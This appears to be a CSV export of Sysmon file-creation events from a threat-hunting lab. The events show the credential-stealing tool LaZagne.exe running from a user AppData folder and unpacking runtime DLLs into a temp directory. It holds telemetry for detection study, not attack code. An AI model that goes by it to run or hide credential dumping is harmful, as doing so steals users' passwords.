12-12T16:59:59.000-0500",created,,,,,,,,,,,WindowsTarget,,,,,,,WindowsTarget,,WindowsTarget,99902,"endpoint_services_processes ms-sysmon-filemod windows_event_signature windows_ta_data",,"2024-12-12 21:59:59.138",,,"api-ms-win-core-file-l2-1-0.dll","C:\Users\inf808\AppData\Local\Temp\_MEI35082\api-ms-win-core-file-l2-1-0.dll",,WindowsTarget,,,99902,main,1,,,,,,,,,,file,,,,,,,,,,,,,,,,"LaZagne.exe","{8e02ef74-5cde-675b-5708-000000002a00}",,3508,,"LaZagne.exe","C:\Users\inf808\AppData\Local\inf808\LaZagne.exe",,,,"<_='://../////'><><_='--'_='{----}'/><></><></><><",,,,,,,,,,,,,,,,,,,,,,informational,4,FileCreate,11,"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",XmlWinEventLog,FedoraThreatHunting,,,,,,,,,,,,,,,,,,,,,"endpoint
filesystem
track_event_signatures",,,,"endpoint
filesystem
track_event_signatures",filesystem,,,,,,,,inf808,,,"'S-1-5-18'",,,,,"Microsoft Sysmon"
,,,,,,,,,,,,,,,"Microsoft-Windows-Sysmon/Operational",,,,,,,,,WindowsTarget,,,"2024-12-12 21:59:59.136",,,,,,,,,,,,,,,"Microsoft-Windows-Sysmon/Operational",11,"<Data Name='RuleName'>DLL</Data><Data Name='UtcTime'>2024-12-12 21:59:59.137</Data><Data Name='ProcessGuid'>{8e02ef74-5cde-675b-5708-000000002a00}</Data><Data Name='ProcessId'>3508</Data><Data Name='Image'>C:\Users\inf808\AppData\Local\inf808\LaZagne.exe</Data><Data Name='TargetFilename'>C:\Users\inf808\AppData\Local\Temp\_MEI35082\api-ms-win-core-file-l1-2-0.dll</Data><Data Name='CreationUtcTime'>2024-12-12 21:59:59.136</Data><Data Name='User'>WindowsTarget\inf808</Data>",FileCreate,11,99901,,,,,,,,,,,"'{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'",,,,,"C:\Users\inf808\AppData\Local\inf808\LaZagne.exe",,,,,,,,0x8000000000000000,4,,,,,,,,,,,,,,,,,,,,"'Microsoft-Windows-Sysmon'",,,,,,,,,,,,,0,,,,,,,,,,,,,,"{8e02ef74-5cde-675b-5708-000000002a00}","'3780'",3508,,,,,,,,,,99901,99901,,,,,DLL,,,,,"S-1-5-18",,,,,,,,,,,,,,,,,,,,,,"'2024-12-12T21:59:59.1375406Z'","<Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-12T21:59:59.1375406Z'/><EventRecordID>99901</EventRecordID><Correlation/><Execution ProcessID='3780' ThreadID='5104'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WindowsTarget</Computer><Security UserID='S-1-5-18'/>",,"C:\Users\inf808\AppData\Local\Temp\_MEI35082\api-ms-win-core-file-l1-2-0.dll",,,,,,,,,,,,,,,11,"System Parameter Settings",,"'5104'","2024-12-12T21:59:59.1375406Z",,,,,"WindowsTarget\inf808","'S-1-5-18'",,,,,,,,,,"2024-12-12 21:59:59.137",2,,,,,"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-12T21:59:59.1375406Z'/><EventRecordID>99901</EventRecordID><Correlation/><Execution ProcessID='3780' ThreadID='5104'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WindowsTarget</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>DLL</Data><Data Name='UtcTime'>2024-12-12 21:59:59.137</Data><Data Name='ProcessGuid'>{8e02ef74-5cde-675b-5708-000000002a00}</Data><Data Name='ProcessId'>3508</Data><Data Name='Image'>C:\Users\inf808\AppData\Local\inf808\LaZagne.exe</Data><Data Name='TargetFilename'>C:\Users\inf808\AppData\Local\Temp\_MEI35082\api-ms-win-core-file-l1-2-0.dll</Data><Data Name='CreationUtcTime'>2024-12-12 21:59:59.136</Data><Data Name='User'>WindowsTarget\inf808</Data></EventData></Event>","2024-12-12T16:59:59.000-0500",modified,,,,,,,,,,,WindowsTarget,,,,,,,WindowsTarget,,WindowsTarget,99901,"endpoint_services_processes ms-sysmon-filemod windows_event_signature windows_ta_data",,"2024-12-12 21:59:59.136",,,"api-ms-win-core-file-l1-2-0.dll","C:\Users\inf808\AppData\Local\Temp\_MEI35082\api-ms-win-core-file-l1-2-0.dll",,WindowsTarget,,,99901,main,1,,,,,,,,,,file,,,,,,,,,,,,,,,,"LaZagne.exe","{8e02ef74-5cde-675b-5708-000000002a00}",,3508,,"LaZagne.exe","C:\Users\inf808\AppData\Local\inf808\LaZagne.exe",,,,"<_='://../////'><><_='--'_='{----}'/><></><></><><",,,,,,,,,,,,,,,,,,,,,,informational,4,FileCreate,11,"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",XmlWinEventLog,FedoraThreatHunting,,,,,,,,,,,,,,,,,,,,,"endpoint
filesystem
track_event_signatures",,,,"endpoint
filesystem
track_event_signatures",filesystem,,,,,,,,inf808,,,"'S-1-5-18'",,,,,"Microsoft Sysmon"
,,,,,,,,,,,,,,,"Microsoft-Windows-Sysmon/Operational",,,,,,,,,WindowsTarget,,,"2024-12-12 21:59:59.135",,,,,,,,,,,,,,,"Microsoft-Windows-Sysmon/Operational",11,"<Data Name='RuleName'>DLL</Data><Data Name='UtcTime'>2024-12-12 21:59:59.135</Data><Data Name='ProcessGuid'>{8e02ef74-5cde-675b-5708-000000002a00}</Data><Data Name='ProcessId'>3508</Data><Data Name='Image'>C:\Users\inf808\AppData\Local\inf808\LaZagne.exe</Data><Data Name='TargetFilename'>C:\Users\inf808\AppData\Local\Temp\_MEI35082\api-ms-win-core-file-l1-1-0.dll</Data><Data Name='CreationUtcTime'>2024-12-12 21:59:59.135</Data><Data Name='User'>WindowsTarget\inf808</Data>",FileCreate,11,99900,,,,,,,,,,,"'{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'",,,,,"C:\Users\inf808\AppData\Local\inf808\LaZagne.exe",,,,,,,,0x8000000000000000,4,,,,,,,,,,,,,,,,,,,,"'Microsoft-Windows-Sysmon'",,,,,,,,,,,,,0,,,,,,,,,,,,,,"{8e02ef74-5cde-675b-5708-000000002a00}","'3780'",3508,,,,,,,,,,99900,99900,,,,,DLL,,,,,"S-1-5-18",,,,,,,,,,,,,,,,,,,,,,"'2024-12-12T21:59:59.1362090Z'","<Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-12T21:59:59.1362090Z'/><EventRecordID>99900</EventRecordID><Correlation/><Execution ProcessID='3780' ThreadID='5104'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WindowsTarget</Computer><Security UserID='S-1-5-18'/>",,"C:\Users\inf808\AppData\Local\Temp\_MEI35082\api-ms-win-core-file-l1-1-0.dll",,,,,,,,,,,,,,,11,"System Parameter Settings",,"'5104'","2024-12-12T21:59:59.1362090Z",,,,,"WindowsTarget\inf808","'S-1-5-18'",,,,,,,,,,"2024-12-12 21:59:59.135",2,,,,,"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-12T21:59:59.1362090Z'/><EventRecordID>99900</EventRecordID><Correlation/><Execution ProcessID='3780' ThreadID='5104'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WindowsTarget</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>DLL</Data><Data Name='UtcTime'>2024-12-12 21:59:59.135</Data><Data Name='ProcessGuid'>{8e02ef74-5cde-675b-5708-000000002a00}</Data><Data Name='ProcessId'>3508</Data><Data Name='Image'>C:\Users\inf808\AppData\Local\inf808\LaZagne.exe</Data><Data Name='TargetFilename'>C:\Users\inf808\AppData\Local\Temp\_MEI35082\api-ms-win-core-file-l1-1-0.dll</Data><Data Name='CreationUtcTime'>2024-12-12 21:59:59.135</Data><Data Name='User'>WindowsTarget\inf808</Data></EventData></Event>","2024-12-12T16:59:59.000-0500",created,,,,,,,,,,,WindowsTarget,,,,,,,WindowsTarget,,WindowsTarget,99900,"endpoint_services_processes ms-sysmon-filemod windows_event_signature windows_ta_data",,"2024-12-12 21:59:59.135",,,"api-ms-win-core-file-l1-1-0.dll","C:\Users\inf808\AppData\Local\Temp\_MEI35082\api-ms-win-core-file-l1-1-0.dll",,WindowsTarget,,,99900,main,1,,,,,,,,,,file,,,,,,,,,,,,,,,,"LaZagne.exe","{8e02ef74-5cde-675b-5708-000000002a00}",,3508,,"LaZagne.exe","C:\Users\inf808\AppData\Local\inf808\LaZagne.exe",,,,"<_='://../////'><><_='--'_='{----}'/><></><></><><",,,,,,,,,,,,,,,,,,,,,,informational,4,FileCreate,11,"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",XmlWinEventLog,FedoraThreatHunting,,,,,,,,,,,,,,,,,,,,,"endpoint
filesystem
track_event_signatures",,,,"endpoint
filesystem
track_event_signatures",filesystem,,,,,,,,inf808,,,"'S-1-5-18'",,,,,"Microsoft Sysmon"
,,,,,,,,,,,,,,,"Microsoft-Windows-Sysmon/Operational",,,,,,,,,WindowsTarget,,,"2024-12-12 21:59:59.134",,,,,,,,,,,,,,,"Microsoft-Windows-Sysmon/Operational",11,"<Data Name='RuleName'>DLL</Data><Data Name='UtcTime'>2024-12-12 21:59:59.134</Data><Data Name='ProcessGuid'>{8e02ef74-5cde-675b-5708-000000002a00}</Data><Data Name='ProcessId'>3508</Data><Data Name='Image'>C:\Users\inf808\AppData\Local\inf808\LaZagne.exe</Data><Data Name='TargetFilename'>C:\Users\inf808\AppData\Local\Temp\_MEI35082\api-ms-win-core-errorhandling-l1-1-0.dll</Data><Data Name='CreationUtcTime'>2024-12-12 21:59:59.134</Data><Data Name='User'>WindowsTarget\inf808</Data>",FileCreate,11,99899,,,,,,,,,,,"'{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'",,,,,"C:\Users\inf808\AppData\Local\inf808\LaZagne.exe",,,,,,,,0x8000000000000000,4,,,,,,,,,,,,,,,,,,,,"'Microsoft-Windows-Sysmon'",,,,,,,,,,,,,0,,,,,,,,,,,,,,"{8e02ef74-5cde-675b-5708-000000002a00}","'3780'",3508,,,,,,,,,,99899,99899,,,,,DLL,,,,,"S-1-5-18",,,,,,,,,,,,,,,,,,,,,,"'2024-12-12T21:59:59.1348756Z'","<Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-12T21:59:59.1348756Z'/><EventRecordID>99899</EventRecordID><Correlation/><Execution ProcessID='3780' ThreadID='5104'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WindowsTarget</Computer><Security UserID='S-1-5-18'/>",,"C:\Users\inf808\AppData\Local\Temp\_MEI35082\api-ms-win-core-errorhandling-l1-1-0.dll",,,,,,,,,,,,,,,11,"System Parameter Settings",,"'5104'","2024-12-12T21:59:59.1348756Z",,,,,"WindowsTarget\inf808","'S-1-5-18'",,,,,,,,,,"2024-12-12 21:59:59.134",2,,,,,"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-12T21:59:59.1348756Z'/><EventRecordID>99899</EventRecordID><Correlation/><Execution ProcessID='3780' ThreadID='5104'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WindowsTarget</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>DLL</Data><Data Name='UtcTime'>2024-12-12 21:59:59.134</Data><Data Name='ProcessGuid'>{8e02ef74-5cde-675b-5708-000000002a00}</Data><Data Name='ProcessId'>3508</Data><Data Name='Image'>C:\Users\inf808\AppData\Local\inf808\LaZagne.exe</Data><Data Name='TargetFilename'>C:\Users\inf808\AppData\Local\Temp\_MEI35082\api-ms-win-core-errorhandling-l1-1-0.dll</Data><Data Name='CreationUtcTime'>2024-12-12 21:59:59.134</Data><Data Name='User'>WindowsTarget\inf808</Data></EventData></Event>","2024-12-12T16:59:59.000-0500",created,,,,,,,,,,,WindowsTarget,,,,,,,WindowsTarget,,WindowsTarget,99899,"endpoint_services_processes ms-sysmon-filemod windows_event_signature windows_ta_data",,"2024-12-12 21:59:59.134",,,"api-ms-win-core-errorhandling-l1-1-0.dll","C:\Users\inf808\AppData\Local\Temp\_MEI35082\api-ms-win-core-errorhandling-l1-1-0.dll",,WindowsTarget,,,99899,main,1,,,,,,,,,,file,,,,,,,,,,,,,,,,"LaZagne.exe","{8e02ef74-5cde-675b-5708-000000002a00}",,3508,,"LaZagne.exe","C:\Users\inf808\AppData\Local\inf808\LaZagne.exe",,,,"<_='://../////'><><_='--'_='{----}'/><></><></><><",,,,,,,,,,,,,,,,,,,,,,informational,4,FileCreate,11,"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",XmlWinEventLog,FedoraThreatHunting,,,,,,,,,,,,,,,,,,,,,"endpoint
filesystem
track_event_signatures",,,,"endpoint
filesystem
track_event_signatures",filesystem,,,,,,,,inf808,,,"'S-1-5-18'",,,,,"Microsoft Sysmon"
,,,,,,,,,,,,,,,"Microsoft-Windows-Sysmon/Operational",,,,,,,,,WindowsTarget,,,"2024-12-12 21:59:59.132",,,,,,,,,,,,,,,"Microsoft-Windows-Sysmon/Operational",11,"<Data Name='RuleName'>DLL</Data><Data Name='UtcTime'>2024-12-12 21:59:59.133</Data><Data Name='ProcessGuid'>{8e02ef74-5cde-675b-5708-000000002a00}</Data><Data Name='ProcessId'>3508</Data><Data Name='Image'>C:\Users\inf808\AppData\Local\inf808\LaZagne.exe</Data><Data Name='TargetFilename'>C:\Users\inf808\AppData\Local\Temp\_MEI35082\api-ms-win-core-debug-l1-1-0.dll</Data><Data Name='CreationUtcTime'>2024-12-12 21:59:59.132</Data><Data Name='User'>WindowsTarget\inf808</Data>",FileCreate,11,99898,,,,,,,,,,,"'{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'",,,,,"C:\Users\inf808\AppData\Local\inf808\LaZagne.exe",,,,,,,,0x8000000000000000,4,,,,,,,,,,,,,,,,,,,,"'Microsoft-Windows-Sysmon'",,,,,,,,,,,,,0,,,,,,,,,,,,,,"{8e02ef74-5cde-675b-5708-000000002a00}","'3780'",3508,,,,,,,,,,99898,99898,,,,,DLL,,,,,"S-1-5-18",,,,,,,,,,,,,,,,,,,,,,"'2024-12-12T21:59:59.1336586Z'","<Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-12T21:59:59.1336586Z'/><EventRecordID>99898</EventRecordID><Correlation/><Execution ProcessID='3780' ThreadID='5104'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WindowsTarget</Computer><Security UserID='S-1-5-18'/>",,"C:\Users\inf808\AppData\Local\Temp\_MEI35082\api-ms-win-core-debug-l1-1-0.dll",,,,,,,,,,,,,,,11,"System Parameter Settings",,"'5104'","2024-12-12T21:59:59.1336586Z",,,,,"WindowsTarget\inf808","'S-1-5-18'",,,,,,,,,,"2024-12-12 21:59:59.133",2,,,,,"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-12T21:59:59.1336586Z'/><EventRecordID>99898</EventRecordID><Correlation/><Execution ProcessID='3780' ThreadID='5104'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WindowsTarget</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>DLL</Data><Data Name='UtcTime'>2024-12-12 21:59:59.133</Data><Data Name='ProcessGuid'>{8e02ef74-5cde-675b-5708-000000002a00}</Data><Data Name='ProcessId'>3508</Data><Data Name='Image'>C:\Users\inf808\AppData\Local\inf808\LaZagne.exe</Data><Data Name='TargetFilename'>C:\Users\inf808\AppData\Local\Temp\_MEI35082\api-ms-win-core-debug-l1-1-0.dll</Data><Data Name='CreationUtcTime'>2024-12-12 21:59:59.132</Data><Data Name='User'>WindowsTarget\inf808</Data></EventData></Event>","2024-12-12T16:59:59.000-0500",modified,,,,,,,,,,,WindowsTarget,,,,,,,WindowsTarget,,WindowsTarget,99898,"endpoint_services_processes ms-sysmon-filemod windows_event_signature windows_ta_data",,"2024-12-12 21:59:59.132",,,"api-ms-win-core-debug-l1-1-0.dll","C:\Users\inf808\AppData\Local\Temp\_MEI35082\api-ms-win-core-debug-l1-1-0.dll",,WindowsTarget,,,99898,main,1,,,,,,,,,,file,,,,,,,,,,,,,,,,"LaZagne.exe","{8e02ef74-5cde-675b-5708-000000002a00}",,3508,,"LaZagne.exe","C:\Users\inf808\AppData\Local\inf808\LaZagne.exe",,,,"<_='://../////'><><_='--'_='{----}'/><></><></><><",,,,,,,,,,,,,,,,,,,,,,informational,4,FileCreate,11,"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",XmlWinEventLog,FedoraThreatHunting,,,,,,,,,,,,,,,,,,,,,"endpoint
filesystem
track_event_signatures",,,,"endpoint
filesystem
track_event_signatures",filesystem,,,,,,,,inf808,,,"'S-1-5-18'",,,,,"Microsoft Sysmon"
,,,,,,,,,,,,,,,"Microsoft-Windows-Sysmon/Operational",,,,,,,,,WindowsTarget,,,"2024-12-12 21:59:59.131",,,,,,,,,,,,,,,"Microsoft-Windows-Sysmon/Operational",11,"<Data Name='RuleName'>DLL</Data><Data Name='UtcTime'>2024-12-12 21:59:59.131</Data><Data Name='ProcessGuid'>{8e02ef74-5cde-675b-5708-000000002a00}</Data><Data Name='ProcessId'>3508</Data><Data Name='Image'>C:\Users\inf808\AppData\Local\inf808\LaZagne.exe</Data><Data Name='TargetFilename'>C:\Users\inf808\AppData\Local\Temp\_MEI35082\api-ms-win-core-datetime-l1-1-0.dll</Data><Data Name='CreationUtcTime'>2024-12-12 21:59:59.131</Data><Data Name='User'>WindowsTarget\inf808</Data>",FileCreate,11,99897,,,,,,,,,,,"'{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'",,,,,"C:\Users\inf808\AppData\Local\inf808\LaZagne.exe",,,,,,,,0x8000000000000000,4,,,,,,,,,,,,,,,,,,,,"'Microsoft-Windows-Sysmon'",,,,,,,,,,,,,0,,,,,,,,,,,,,,"{8e02ef74-5cde-675b-5708-000000002a00}","'3780'",3508,,,,,,,,,,99897,99897,,,,,DLL,,,,,"S-1-5-18",,,,,,,,,,,,,,,,,,,,,,"'2024-12-12T21:59:59.1324272Z'","<Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-12T21:59:59.1324272Z'/><EventRecordID>99897</EventRecordID><Correlation/><Execution ProcessID='3780' ThreadID='5104'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WindowsTarget</Computer><Security UserID='S-1-5-18'/>",,"C:\Users\inf808\AppData\Local\Temp\_MEI35082\api-ms-win-core-datetime-l1-1-0.dll",,,,,,,,,,,,,,,11,"System Parameter Settings",,"'5104'","2024-12-12T21:59:59.1324272Z",,,,,"WindowsTarget\inf808","'S-1-5-18'",,,,,,,,,,"2024-12-12 21:59:59.131",2,,,,,"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-12T21:59:59.1324272Z'/><EventRecordID>99897</EventRecordID><Correlation/><Execution ProcessID='3780' ThreadID='5104'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WindowsTarget</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>DLL</Data><Data Name='UtcTime'>2024-12-12 21:59:59.131</Data><Data Name='ProcessGuid'>{8e02ef74-5cde-675b-5708-000000002a00}</Data><Data Name='ProcessId'>3508</Data><Data Name='Image'>C:\Users\inf808\AppData\Local\inf808\LaZagne.exe</Data><Data Name='TargetFilename'>C:\Users\inf808\AppData\Local\Temp\_MEI35082\api-ms-win-core-datetime-l1-1-0.dll</Data><Data Name='CreationUtcTime'>2024-12-12 21:59:59.131</Data><Data Name='User'>WindowsTarget\inf808</Data></EventData></Event>","2024-12-12T16:59:59.000-0500",created,,,,,,,,,,,WindowsTarget,,,,,,,WindowsTarget,,WindowsTarget,99897,"endpoint_services_processes ms-sysmon-filemod windows_event_signature windows_ta_data",,"2024-12-12 21:59:59.131",,,"api-ms-win-core-datetime-l1-1-0.dll","C:\Users\inf808\AppData\Local\Temp\_MEI35082\api-ms-win-core-datetime-l1-1-0.dll",,WindowsTarget,,,99897,main,1,,,,,,,,,,file,,,,,,,,,,,,,,,,"LaZagne.exe","{8e02ef74-5cde-675b-5708-000000002a00}",,3508,,"LaZagne.exe","C:\Users\inf808\AppData\Local\inf808\LaZagne.exe",,,,"<_='://../////'><><_='--'_='{----}'/><></><></><><",,,,,,,,,,,,,,,,,,,,,,informational,4,FileCreate,11,"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",XmlWinEventLog,FedoraThreatHunting,,,,,,,,,,,,,,,,,,,,,"endpoint
filesystem
track_event_signatures",,,,"endpoint
filesystem
track_event_signatures",filesystem,,,,,,,,inf808,,,"'S-1-5-18'",,,,,"Microsoft Sysmon"
,,,,,,,,,,,,,,,"Microsoft-Windows-Sysmon/Operational",,,,,,,,,WindowsTarget,,,"2024-12-12 21:59:59.130",,,,,,,,,,,,,,,"Microsoft-Windows-Sysmon/Operational",11,"<Data Name='RuleName'>DLL</Data><Data Name='UtcTime'>2024-12-12 21:59:59.130</Data><Data Name='ProcessGuid'>{8e02ef74-5cde-675b-5708-000000002a00}</Data><Data Name='ProcessId'>3508</Data><Data Name='Image'>C:\Users\inf808\AppData\Local\inf808\LaZagne.exe</Data><Data Name='TargetFilename'>C:\Users\inf808\AppData\Local\Temp\_MEI35082\api-ms-win-core-console-l1-1-0.dll</Data><Data Name='CreationUtcTime'>2024-12-12 21:59:59.130</Data><Data Name='User'>WindowsTarget\inf808</Data>",FileCreate,11,99896,,,,,,,,,,,"'{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'",,,,,"C:\Users\inf808\AppData\Local\inf808\LaZagne.exe",,,,,,,,0x8000000000000000,4,,,,,,,,,,,,,,,,,,,,"'Microsoft-Windows-Sysmon'",,,,,,,,,,,,,0,,,,,,,,,,,,,,"{8e02ef74-5cde-675b-5708-000000002a00}","'3780'",3508,,,,,,,,,,99896,99896,,,,,DLL,,,,,"S-1-5-18",,,,,,,,,,,,,,,,,,,,,,"'2024-12-12T21:59:59.1310993Z'","<Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-12T21:59:59.1310993Z'/><EventRecordID>99896</EventRecordID><Correlation/><Execution ProcessID='3780' ThreadID='5104'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WindowsTarget</Computer><Security UserID='S-1-5-18'/>",,"C:\Users\inf808\AppData\Local\Temp\_MEI35082\api-ms-win-core-console-l1-1-0.dll",,,,,,,,,,,,,,,11,"System Parameter Settings",,"'5104'","2024-12-12T21:59:59.1310993Z",,,,,"WindowsTarget\inf808","'S-1-5-18'",,,,,,,,,,"2024-12-12 21:59:59.130",2,,,,,"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-12T21:59:59.1310993Z'/><EventRecordID>99896</EventRecordID><Correlation/><Execution ProcessID='3780' ThreadID='5104'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WindowsTarget</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>DLL</Data><Data Name='UtcTime'>2024-12-12 21:59:59.130</Data><Data Name='ProcessGuid'>{8e02ef74-5cde-675b-5708-000000002a00}</Data><Data Name='ProcessId'>3508</Data><Data Name='Image'>C:\Users\inf808\AppData\Local\inf808\LaZagne.exe</Data><Data Name='TargetFilename'>C:\Users\inf808\AppData\Local\Temp\_MEI35082\api-ms-win-core-console-l1-1-0.dll</Data><Data Name='CreationUtcTime'>2024-12-12 21:59:59.130</Data><Data Name='User'>WindowsTarget\inf808</Data></EventData></Event>","2024-12-12T16:59:59.000-0500",created,,,,,,,,,,,WindowsTarget,,,,,,,WindowsTarget,,WindowsTarget,99896,"endpoint_services_processes ms-sysmon-filemod windows_event_signature windows_ta_data",,"2024-12-12 21:59:59.130",,,"api-ms-win-core-console-l1-1-0.dll","C:\Users\inf808\AppData\Local\Temp\_MEI35082\api-ms-win-core-console-l1-1-0.dll",,WindowsTarget,,,99896,main,1,,,,,,,,,,file,,,,,,,,,,,,,,,,"LaZagne.exe","{8e02ef74-5cde-675b-5708-000000002a00}",,3508,,"LaZagne.exe","C:\Users\inf808\AppData\Local\inf808\LaZagne.exe",,,,"<_='://../////'><><_='--'_='{----}'/><></><></><><",,,,,,,,,,,,,,,,,,,,,,informational,4,FileCreate,11,"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",XmlWinEventLog,FedoraThreatHunting,,,,,,,,,,,,,,,,,,,,,"endpoint
filesystem
track_event_signatures",,,,"endpoint
filesystem
track_event_signatures",filesystem,,,,,,,,inf808,,,"'S-1-5-18'",,,,,"Microsoft Sysmon"
,,,,,,,,,,,,,,,"Microsoft-Windows-Sysmon/Operational",,,,,,,,,WindowsTarget,,,"2024-12-12 21:59:59.104",,,,,,,,,,,,,,,"Microsoft-Windows-Sysmon/Operational",11,"<Data Name='RuleName'>DLL</Data><Data Name='UtcTime'>2024-12-12 21:59:59.104</Data><Data Name='ProcessGuid'>{8e02ef74-5cde-675b-5708-000000002a00}</Data><Data Name='ProcessId'>3508</Data><Data Name='Image'>C:\Users\inf808\AppData\Local\inf808\LaZagne.exe</Data><Data Name='TargetFilename'>C:\Users\inf808\AppData\Local\Temp\_MEI35082\VCRUNTIME140.dll</Data><Data Name='CreationUtcTime'>2024-12-12 21:59:59.104</Data><Data Name='User'>WindowsTarget\inf808</Data>",FileCreate,11,99895,,,,,,,,,,,"'{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'",,,,,"C:\Users\inf808\AppData\Local\inf808\LaZagne.exe",,,,,,,,0x8000000000000000,4,,,,,,,,,,,,,,,,,,,,"'Microsoft-Windows-Sysmon'",,,,,,,,,,,,,0,,,,,,,,,,,,,,"{8e02ef74-5cde-675b-5708-000000002a00}","'3780'",3508,,,,,,,,,,99895,99895,,,,,DLL,,,,,"S-1-5-18",,,,,,,,,,,,,,,,,,,,,,"'2024-12-12T21:59:59.1054032Z'","<Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-12T21:59:59.1054032Z'/><EventRecordID>99895</EventRecordID><Correlation/><Execution ProcessID='3780' ThreadID='5104'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WindowsTarget</Computer><Security UserID='S-1-5-18'/>",,"C:\Users\inf808\AppData\Local\Temp\_MEI35082\VCRUNTIME140.dll",,,,,,,,,,,,,,,11,"System Parameter Settings",,"'5104'","2024-12-12T21:59:59.1054032Z",,,,,"WindowsTarget\inf808","'S-1-5-18'",,,,,,,,,,"2024-12-12 21:59:59.104",2,,,,,"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' 